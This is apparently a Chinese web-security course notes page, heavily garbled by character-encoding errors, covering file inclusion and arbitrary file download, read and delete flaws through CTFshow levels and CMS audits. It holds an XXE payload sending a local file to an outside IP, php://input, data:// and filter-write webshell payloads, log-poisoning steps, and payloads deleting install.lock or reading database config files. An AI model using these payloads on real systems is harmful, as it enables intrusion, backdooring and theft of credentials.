<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">ANY</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">remote</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">testdtd</span>&quot;&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send:<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">testdtd:</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">all</span> &quot;&lt;<span class="attr">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &#x27;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">get.php</span>?<span class="attr">file</span>=<span class="string">%file;</span>&#x27;&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬42å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶åŒ…å«-LFI-RFI-ä¼ªåè®®ç¼–ç ç®—æ³•-ä»£ç å®¡è®¡"><a href="#ç¬¬42å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶åŒ…å«-LFI-RFI-ä¼ªåè®®ç¼–ç ç®—æ³•-ä»£ç å®¡è®¡" class="headerlink" title="ç¬¬42å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶åŒ…å«&amp;LFI&amp;RFI&amp;ä¼ªåè®®ç¼–ç ç®—æ³•&amp;ä»£ç å®¡è®¡"></a>ç¬¬42å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶åŒ…å«&amp;LFI&amp;RFI&amp;ä¼ªåè®®ç¼–ç ç®—æ³•&amp;ä»£ç å®¡è®¡</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-22"><a href="#çŸ¥è¯†ç‚¹ï¼š-22" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€è§£é‡Šä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«<br>2ã€åˆ†ç±»-æœ¬åœ°LFæœˆ&amp;è¿œç¨‹RFI<br>3ã€åˆ©ç”¨-é…åˆä¸Šä¼ &amp;æ—¥å¿—&amp;ä¼šè¯<br>4ã€åˆ©ç”¨-ä¼ªåè®®&amp;ç¼–ç &amp;ç®—æ³•ç­‰</p>
<h4 id="æ ¸å¿ƒçŸ¥è¯†ï¼š"><a href="#æ ¸å¿ƒçŸ¥è¯†ï¼š" class="headerlink" title="#æ ¸å¿ƒçŸ¥è¯†ï¼š"></a>#æ ¸å¿ƒçŸ¥è¯†ï¼š</h4><p>1ã€æœ¬åœ°åŒ…å«LF1&amp;è¿œç¨‹åŒ…å«RF1-åŒºåˆ«<br>ä¸€ä¸ªåªèƒ½åŒ…å«æœ¬åœ°ï¼Œä¸€ä¸ªå¯ä»¥è¿œç¨‹åŠ è½½<br>å…·ä½“å½¢æˆåŸå› ç”±ä»£ç å’Œç¯å¢ƒ<a href="https://so.csdn.net/so/search?q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">é…ç½®æ–‡ä»¶</a>å†³å®š<br>2ã€å„ç±»<a href="https://so.csdn.net/so/search?q=%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">è„šæœ¬è¯­è¨€</a>åŒ…å«ä»£ç å†™æ³•-è§ä¸‹æ–‡</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!--#include file=<span class="string">&quot;1.asp&quot;</span>--&gt;</span><br><span class="line">&lt;!--#include file=<span class="string">&quot;top.aspx&quot;</span>-&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">c:import</span> <span class="attr">url</span>=<span class="string">&quot;http://thief.one/1.jsp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">jsp:include</span> <span class="attr">page</span>=<span class="string">&quot;head.jsp&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%@include file=&quot;head.jsp&quot;%&gt;</span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?php include(test.php&#x27;)?</span></span></span><br></pre></td></tr></table></figure>

<p>3ã€PHPæ–‡ä»¶åŒ…å«ä¼ªåè®®ç©æ³•</p>
<p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
<h4 id="æ€è·¯è¦ç‚¹ï¼š"><a href="#æ€è·¯è¦ç‚¹ï¼š" class="headerlink" title="#æ€è·¯è¦ç‚¹ï¼š"></a>#æ€è·¯è¦ç‚¹ï¼š</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘ç›’å‘ç°ï¼šä¸»è¦è§‚å¯Ÿå‚æ•°ä¼ é€’çš„æ•°æ®å’Œæ–‡ä»¶åæ˜¯å¦å¯¹åº”</span><br><span class="line">-ç™½ç›’å‘ç°ï¼š 1ã€å¯é€šè¿‡åº”ç”¨åŠŸèƒ½è¿½è¸ªä»£ç å®šä½å®¡è®¡</span><br><span class="line">2ã€å¯é€šè¿‡å´æœ¬ç‰¹å®šå‡½æ•°æœç´¢å®šä½å®¡è®¡</span><br><span class="line">3ã€å¯é€šè¿‡ä¼ªåè®®ç©æ³•ç»•è¿‡ç›¸å…³ä¿®å¤ç­‰</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="æœ¬è¯¾æ€»ç»“ï¼š"><a href="#æœ¬è¯¾æ€»ç»“ï¼š" class="headerlink" title="#æœ¬è¯¾æ€»ç»“ï¼š"></a>#æœ¬è¯¾æ€»ç»“ï¼š</h4><p>1ã€æœ‰å¯æ§æ–‡ä»¶å¦‚èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œé…åˆä¸Šä¼ ååŒ…å«<br>2ã€æ— å¯æ§æ–‡ä»¶å¯ä»¥åˆ©ç”¨æ—¥å¿—æˆ–Session&amp;ä¼ªåè®®<br>3ã€ä»£ç å›½å®šç›®å½•åŠæ–‡ä»¶åç¼€æ—¶éœ€è€ƒè™‘ç‰ˆæœ¬ç»•è¿‡<br>4ã€ä¼ªåè®®ç©æ³•æ˜¯å»ºç«‹åœ¨ä»£ç ä¸­åªæœ‰å˜é‡å­˜åœ¨æ—¶</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-19"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-19" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>å‰ç½®çŸ¥è¯†-åŸç†&amp;åˆ†ç±»&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;ä¿®å¤<br>CTFåº”ç”¨-CTFSHOW-78å…³å¡åˆ°117å…³å¡<br>CMSæºç -XHCMS-ä»£ç å®¡è®¡&amp;æ—¥å¿—&amp;ç»•è¿‡</p>
<h4 id="å‰ç½®çŸ¥è¯†-åŸç†-åˆ†ç±»-æ¢é’ˆ-åˆ©ç”¨-ä¿®å¤"><a href="#å‰ç½®çŸ¥è¯†-åŸç†-åˆ†ç±»-æ¢é’ˆ-åˆ©ç”¨-ä¿®å¤" class="headerlink" title="#å‰ç½®çŸ¥è¯†-åŸç†&amp;åˆ†ç±»&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;ä¿®å¤"></a>#å‰ç½®çŸ¥è¯†-åŸç†&amp;åˆ†ç±»&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;ä¿®å¤</h4><p>æ¯”å¦‚è¯´1.phpå†™å…¥phpinfo(); ç„¶å2.txtå†™å…¥ include(â€˜1.txtâ€™);é‚£ä¹ˆåœ¨è®¿é—®2.phpæ—¶å°±ä¼šè¿”å›1.phpä¸­çš„å†…å®¹ï¼ŒåŒæ ·è¿‡æ»¤ä¹Ÿæ˜¯ï¼Œåªéœ€è¦å…ˆå°†è¿‡æ»¤çš„å‡½æ•°å®šä¹‰å¥½ï¼Œç„¶ååœ¨éœ€è¦è¿‡æ»¤çš„åœ°æ–¹ç›´æ¥includeï¼Œç›¸å½“äºå¼•ç”¨ã€‚åŒ…å«å³æ‰§è¡Œï¼Œphpæ–‡ä»¶ä¸­åŒ…å«txtæ–‡ä»¶ï¼Œä¹Ÿä¼šä»¥phpæ‰§è¡Œã€‚</p>
<blockquote>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº›ctfshowçš„åˆ·é¢˜è®°å½•ï¼Œctfshowä¸Šçš„æ–‡ä»¶åŒ…å«è¿˜æ˜¯è®²çš„å¾ˆè¯¦ç»†çš„ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>
</blockquote>
<h4 id="CTFåº”ç”¨-CTFSHOW-78å…³å¡åˆ°117å…³å¡"><a href="#CTFåº”ç”¨-CTFSHOW-78å…³å¡åˆ°117å…³å¡" class="headerlink" title="#CTFåº”ç”¨-CTFSHOW-78å…³å¡åˆ°117å…³å¡"></a>#CTFåº”ç”¨-CTFSHOW-78å…³å¡åˆ°117å…³å¡</h4><p>PHPä¼ªåè®®å‚è€ƒé“¾æ¥ï¼š<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
<h6 id="78-php-httpåè®®"><a href="#78-php-httpåè®®" class="headerlink" title="78-php&amp;httpåè®®"></a>78-php&amp;httpåè®®</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">payload:?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);? payload:?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">æ€è·¯ï¼šè§‚å¯Ÿç½‘ç«™å¹¶ä¸å­˜åœ¨ä¸Šä¼ ç‚¹ï¼Œåªæœ‰ä¼ å‚å¤„â€“å°è¯•ç›´æ¥è¯»å–flag.php(?file=flag.php)å¹¶æ— è¿”å›ç»“æœï¼Œç„¶åå°è¯•ä½¿ç”¨ä¼ªåè®® (php://input ä½¿ç”¨postæäº¤æ•°æ®)â€“å†ä½¿ç”¨php systemæ‰§è¡Œè¯»å–å½“å‰è·¯å¾„æ–‡ä»¶lsâ€“è¯»å–æ–‡ä»¶å†…å®¹tac</span><br></pre></td></tr></table></figure>

<h6 id="79-data-httpåè®®"><a href="#79-data-httpåè®®" class="headerlink" title="79-data&amp;httpåè®®"></a>79-data&amp;httpåè®®</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?file=data://text/plain.&lt;?=system(tac flag.&quot;)?&gt;I</span><br><span class="line">payload</span><br><span class="line">?file=data://text/plain:base64.PD9waHAgc3lzdGVtKCdoYWMgZmxhZy5waHAnKTs/Pg==</span><br><span class="line">payload:?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">æ€è·¯ï¼šæœ‰å‰ç«¯JSå¯çŸ¥æ­¤å¤„è¿‡æ»¤äº†phpå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨dataã€httpè¿œç¨‹åŒ…å«ç»•è¿‡</span><br></pre></td></tr></table></figure>

<h6 id="80-81-æ—¥å¿—åŒ…å«"><a href="#80-81-æ—¥å¿—åŒ…å«" class="headerlink" title="80 81-æ—¥å¿—åŒ…å«"></a>80 81-æ—¥å¿—åŒ…å«</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€åˆ©ç”¨å…¶ä»–åè®®å¦‚fle,zibç­‰</span><br><span class="line">2ã€åˆ©ç”¨æ—¥å¿—è®°å½•UAç‰¹æ€§åŒ…å«æ‰§è¡Œ</span><br><span class="line">åˆ†å¿»éœ€æ–‡ä»¶ååŠå¸¦æœ‰phpå…³é”®å­—æ”¾å¼ƒ</span><br><span class="line">æ•…åˆ©ç”¨æ—¥å¿—è®°å½•UAä¿¡æ¯ï¼ŒUAå¸¦å…¥ä»£ç </span><br><span class="line">åŒ…å«ï¼švar/log/nginx/access.log</span><br><span class="line">æ€è·¯ï¼šæœ‰JSä»£ç å¯ä»¥æ­¤å¤„è¿‡æ»¤äº†PHPå’ŒDATAåè®®ï¼Œå°è¯•ä½¿ç”¨httpè¿œç¨‹åŒ…å«ä¹Ÿæ²¡æœ‰è¿”å›ç»“æœè¯´æ˜ç½‘ç«™å…³é—­äº†è¿œç¨‹æ–‡ä»¶åŒ…å«</span><br><span class="line"></span><br><span class="line">åç»­åªèƒ½ä½¿ç”¨zipå’Œ fileåè®® ä½†æ˜¯ä¸¤è€…éƒ½éœ€è¦çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡ä¿¡æ¯æ”¶é›†çŸ¥é“ä¸­é—´ä»¶ä¸ºnginxï¼Œå°è¯•è¯»å–æ—¥å¿—æ–‡ä»¶ï¼Œ/var/log/nginx/acess.log,è¯»å–æˆåŠŸå°è¯•é€šè¿‡ä¿®æ”¹UAä¿¡æ¯å†™å…¥è¯»å–å½“å‰è·¯å¾„æ–‡ä»¶(&lt;?php system(&#x27;ls&#x27;);?&gt;)â€“è¯»å–flag(&lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;)</span><br></pre></td></tr></table></figure>

<h6 id="81å…³-å¢åŠ è¿‡æ»¤äº†-ä»å¯ä»¥ä½¿ç”¨æ—¥å¿—æ–‡ä»¶ç»•è¿‡"><a href="#81å…³-å¢åŠ è¿‡æ»¤äº†-ä»å¯ä»¥ä½¿ç”¨æ—¥å¿—æ–‡ä»¶ç»•è¿‡" class="headerlink" title="81å…³ å¢åŠ è¿‡æ»¤äº† : ä»å¯ä»¥ä½¿ç”¨æ—¥å¿—æ–‡ä»¶ç»•è¿‡"></a>81å…³ å¢åŠ è¿‡æ»¤äº† : ä»å¯ä»¥ä½¿ç”¨æ—¥å¿—æ–‡ä»¶ç»•è¿‡</h6><h6 id="82-86-SESSIONåŒ…å«"><a href="#82-86-SESSIONåŒ…å«" class="headerlink" title="82-86-SESSIONåŒ…å«"></a>82-86-SESSIONåŒ…å«</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/Interpreter/p/14086164.html</span><br><span class="line">https://www.cnblogs.com/echoDetected/p/13976405.html</span><br></pre></td></tr></table></figure>

<h6 id="87-php-filter-write-åŠ å¯†ç¼–ç "><a href="#87-php-filter-write-åŠ å¯†ç¼–ç " class="headerlink" title="87-php:&#x2F;filter&#x2F;write&amp;åŠ å¯†ç¼–ç "></a>87-php:&#x2F;filter&#x2F;write&amp;åŠ å¯†ç¼–ç </h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€åˆ©ç”¨base64</span><br><span class="line">urç¼–aç 2æ¬¡ï¼šphp/filter/write=convert.base64-decode/resource=123.php</span><br><span class="line">content=aaPD9waHAgQGV2YWwOJF9QT1NUW2FdKTs/Pg==</span><br><span class="line">2ã€åˆ©ç”¨å‡¯æ’’13:</span><br><span class="line">urç¼–ç 2æ¬¡ï¼šphp:/filter/write=string.rot13/resource=2.php</span><br><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp s*.cuc&#x27;):?&gt;  </span><br></pre></td></tr></table></figure>

<p>æ€è·¯ï¼šå¢åŠ äº† â€œ.â€ è¿‡æ»¤ï¼Œè‡´ä½¿ä¸èƒ½ç›´æ¥ä½¿ç”¨æ—¥å¿—,æ‰€ä»¥ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œè¿™é‡Œä½¿ç”¨phpå†™å…¥å‚æ•°ï¼Œç„¶åä¼ å‚å‡ºå†™å…¥åé—¨ä»£ç è¯»å–</p>
<h6 id="88-data-base64åè®®"><a href="#88-data-base64åè®®" class="headerlink" title="88-data&amp;base64åè®®"></a>88-data&amp;base64åè®®</h6><p>è¿‡æ»¤PHP,å„ç§ç¬¦å·ï¼Œphpä»£ç ç¼–ç å†™å‡ºæ— ç¬¦å·base64å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdoYWMgKi5waHAnKTtlY2hvIDEyMz</span><br><span class="line">s/PmFK</span><br></pre></td></tr></table></figure>

<p>æ€è·¯ï¼šæ­¤å¤„è¿‡æ»¤å¦‚ä¸‹å›¾ï¼Œæ²¡æœ‰è¿‡æ»¤dataï¼Œå°è¯•å°†dataåæ•°æ®è¿›è¡Œbase64ç¼–ç ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.:ä¸€ç§è¿‡æ»¤å™¨ï¼Œå’Œä½¿ç”¨iconvOâ˜’æ•°å¤„ç†æµæ•°æ®æœ‰ç­‰åŒä½œç”¨</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[a]):?&gt;)</span></span><br><span class="line"><span class="string">echo&quot;ç»è¿‡ä¸€æ¬¡åè½¬ï¼š&quot;$result.&quot;\n&quot;</span></span><br><span class="line"><span class="string">echo&quot;ç»è¿‡ç¬¬äºŒæ¬¡åè½¬ï¼š&quot;.iconv(UCS-2LE&quot;,&quot;UCS-2BE&quot;,$result):</span></span><br><span class="line"><span class="string">ï¼Ÿ&gt;</span></span><br><span class="line"><span class="string">Payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line"><span class="string">contents=?&lt;hp pvelas(P_SOã€ã€‘a,)&gt;?</span></span><br></pre></td></tr></table></figure>

<h4 id="CMSæºç -XHCMS-ä»£ç å®¡è®¡-æ—¥å¿—-ç»•è¿‡"><a href="#CMSæºç -XHCMS-ä»£ç å®¡è®¡-æ—¥å¿—-ç»•è¿‡" class="headerlink" title="#CMSæºç -XHCMS-ä»£ç å®¡è®¡&amp;æ—¥å¿—&amp;ç»•è¿‡"></a>#CMSæºç -XHCMS-ä»£ç å®¡è®¡&amp;æ—¥å¿—&amp;ç»•è¿‡</h4><p>1ã€æœç´¢ç‰¹å®šå‡½æ•°å¯»åŒ…å«ç‚¹<br>2ã€å›½å®šç›®å½•åŠåç¼€åéœ€ç»•è¿‡<br>3ã€ç”±CMSæ— ä¸Šä¼ ç”¨æ—¥å¿—åŒ…å«<br>4ã€åˆ©ç”¨é•¿åº¦ç»•è¿‡åç¼€åå›ºå®š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http://172.16.11.27/xhcms/?r=../../../nginx/logs/error.log...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p>-ç™½ç›’å‘ç°ï¼š</p>
<p>1ã€å¯é€šè¿‡åº”ç”¨åŠŸèƒ½è¿½è¸ªä»£ç å®šä½å®¡è®¡</p>
<p>2ã€å¯é€šè¿‡è„šæœ¬ç‰¹å®šå‡½æ•°æœç´¢å®šä½å®¡è®¡</p>
<p>3ã€å¯é€šè¿‡ä¼ªåè®®ç©æ³•ç»•è¿‡ç›¸å…³ä¿®å¤ç­‰</p>
<h4 id="æœ¬è¯¾æ€»ç»“ï¼š-1"><a href="#æœ¬è¯¾æ€»ç»“ï¼š-1" class="headerlink" title="#æœ¬è¯¾æ€»ç»“ï¼š"></a>#æœ¬è¯¾æ€»ç»“ï¼š</h4><p>1ã€æœ‰å¯æ§æ–‡ä»¶å¦‚èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œé…åˆä¸Šä¼ ååŒ…å«</p>
<p>2ã€æ— å¯æ§æ–‡ä»¶å¯ä»¥åˆ©ç”¨æ—¥å¿—æˆ–Session&amp;ä¼ªåè®®</p>
<p>3ã€ä»£ç å›ºå®šç›®å½•åŠæ–‡ä»¶åç¼€æ—¶éœ€è€ƒè™‘ç‰ˆæœ¬ç»•è¿‡</p>
<p>4ã€ä¼ªåè®®ç©æ³•æ˜¯å»ºç«‹åœ¨ä»£ç ä¸­åªæœ‰å˜é‡å­˜åœ¨æ—¶</p>
<h1 id="ç¬¬43å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-ä»»æ„æ–‡ä»¶ä¸‹è½½-åˆ é™¤é‡è£…-æ•æ„Ÿè¯»å–-é»‘ç™½å®¡è®¡"><a href="#ç¬¬43å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-ä»»æ„æ–‡ä»¶ä¸‹è½½-åˆ é™¤é‡è£…-æ•æ„Ÿè¯»å–-é»‘ç™½å®¡è®¡" class="headerlink" title="ç¬¬43å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;ä»»æ„æ–‡ä»¶ä¸‹è½½&amp;åˆ é™¤é‡è£…&amp;æ•æ„Ÿè¯»å–&amp;é»‘ç™½å®¡è®¡"></a>ç¬¬43å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;ä»»æ„æ–‡ä»¶ä¸‹è½½&amp;åˆ é™¤é‡è£…&amp;æ•æ„Ÿè¯»å–&amp;é»‘ç™½å®¡è®¡</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-23"><a href="#çŸ¥è¯†ç‚¹ï¼š-23" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C&spm=1001.2101.3001.7020">æ–‡ä»¶æ“ä½œ</a>ç±»å®‰å…¨é—®é¢˜<br>2ã€æ–‡ä»¶ä¸‹è½½&amp;å†Œé™¤&amp;è¯»å–<br>3ã€ç™½ç›’&amp;é»‘ç›’&amp;æ¢é’ˆåˆ†æ</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-8"><a href="#è¯¦ç»†ç‚¹ï¼š-8" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p><a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">æ–‡ä»¶è¯»å–</a>ï¼šåŸºæœ¬å’Œæ–‡ä»¶ä¸‹è½½åˆ©ç”¨ç±»ä¼¼<br>æ–‡ä»¶ä¸‹è½½ï¼šåˆ©ç”¨ä¸‹è½½è·å–æºç æˆ–æ•°æ®åº“é…ç½®æ–‡ä»¶åŠç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ä¸ºåç»­å‡ºæ€è·¯<br>æ–‡ä»¶åˆ é™¤ï¼šé™¤è‡ªèº«å®‰å…¨å¼•å‘çš„æ–‡ä»¶é™¤å¤–ï¼Œå¯é…åˆåˆ é™¤é‡è£…é”å®šæ–‡ä»¶è¿›è¡Œé‡è£…</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-20"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-20" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p><strong>å®¡è®¡åˆ†æ-æ–‡ä»¶ä¸‹è½½XHCMS-åŠŸèƒ½ç‚¹</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/589245286">https://zhuanlan.zhihu.com/p/589245286</a></p>
<p>æ€è·¯ï¼šé€šè¿‡è®¿é—®é“¾æ¥æ‰¾å¯»æ–‡ä»¶å†…å®¹é€æ­¥å¾—çŸ¥ä¸‹è½½å˜é‡åœ¨å‡½æ•°ä¼ é€’çš„è·¯å¾„â€“å…¨å±€æœç´¢update insetå˜é‡æ‰¾å¯»æ–‡ä»¶ä¸Šä¼ ç‚¹â€“è®¿é—®ä¸Šä¼ ç‚¹å°è¯•æ„é€ ä¸‹è½½å†…å®¹â€“è®¿é—®ä¸‹è½½é“¾æ¥æˆåŠŸ</p>
<p><strong>å®¡è®¡åˆ†æ-æ–‡ä»¶è¯»å–-Metlnfo-.å‡½æ•°æœç´¢</strong></p>
<p><a href="https://blog.csdn.net/ZhaoSong_/article/details/132601103">https://blog.csdn.net/ZhaoSong_/article/details/132601103</a></p>
<p><strong>å®¡è®¡åˆ†æ-æ–‡ä»¶åˆ é™¤74CMS-å‡½æ•°æœç´¢</strong></p>
<p><a href="https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2">https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/755bc63622561d92fa1c9ad2a5c7795c--c69c--image-20240408163202959.png" alt="image-20240408163202959"></p>
<p>æ‰¾åˆ°æ¼æ´å¤„ï¼Œç„¶åé€‰æ‹©å»åˆ é™¤é‡è£…æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/66393751a8de0328edac9bcaadad6294--9492--image-20240408163401656.png" alt="image-20240408163401656"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/52659ecc6bacdd0f317d4bee44f90b4e--5e82--image-20240408163812708.png" alt="image-20240408163812708"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œæœ‰ç‚¹è¦æ³¨æ„ï¼Œéœ€è¦ä»adminç›®å½•ä¸‹ç›´æ¥è®¿é—®è¿™é‡Œæ‰èƒ½è·³è¿‡csrfçš„ç›‘æµ‹</span><br></pre></td></tr></table></figure>

<p>æ€è·¯ï¼šé€šè¿‡å‡½æ•°æ‰¾åˆ°æ–‡ä»¶åˆ é™¤ç‚¹ï¼Œç„¶åæ‰¾åˆ°æ–‡ä»¶æ·»åŠ å‡ºé€šè¿‡åˆ é™¤å‡½æ•°ä¼ å‚åˆ é™¤installæ–‡ä»¶è‡´ä½¿ç½‘ç«™è¿›è¡Œé‡æ–°é…ç½®â€“å¯å°†ç½‘ç«™æ•°æ®åº“è¿æ¥åˆ°æœ¬åœ°ã€‚</p>
<p><strong>é»‘ç›’åˆ†æ-ä¸‹è½½è¯»å–-ä¸‹è½½èµ„æºURLå‚æ•°</strong></p>
<p>é€šè¿‡ç™¾åº¦å¯çŸ¥è¯¥æ¡†æ¶ä¸‹æ•°æ®åº“è¿æ¥æ–‡ä»¶çš„é»˜è®¤è·¯å¾„ï¼Œæ„é€ è¿æ¥è¿›è¡Œä¸‹è½½<br><a href="http://67.202.70.133/files/readfile.php?file=%E2%80%A6/configuration.php">http://67.202.70.133/files/readfile.php?file=â€¦/configuration.php</a></p>
<h4 id="ç™½ç›’å®¡è®¡ï¼š"><a href="#ç™½ç›’å®¡è®¡ï¼š" class="headerlink" title="#ç™½ç›’å®¡è®¡ï¼š"></a>#ç™½ç›’å®¡è®¡ï¼š</h4><p>1ã€æ–‡ä»¶ä¸‹è½½<br>æµç¨‹åŠŸèƒ½ç‚¹æŠ“åŒ…å¯»ä»£ç æ–‡ä»¶å¯»å˜é‡æ§åˆ¶æ„é€ æµ‹è¯•<br>Payload:softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt<br>2ã€æ–‡ä»¶åˆ é™¤ï¼š74CMS-é…åˆåˆ é™¤é‡è£…<br>æµç¨‹ç‰¹å®šå‡½æ•°æœç´¢å¯»å‘è°ƒç”¨-æ„é€ Payloadæµ‹è¯•<br>Payload:&#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;â€¦&#x2F;â€¦&#x2F;data&#x2F;install.lock<br>3ã€æ–‡ä»¶è¯»å–ï¼šMetlnfo-ä»»æ„è¯»å–<br>æµç¨‹ã€‚ç‰¹å®šå‡½æ•°æ´ç´¢å¯»èå‘è°ƒç”¨-æ„é€ Payloadæµ‹è¯•<br>Payload:&#x2F;include&#x2F;thumb.php?dir&#x3D;httpâ€¦\config\config_db.php</p>
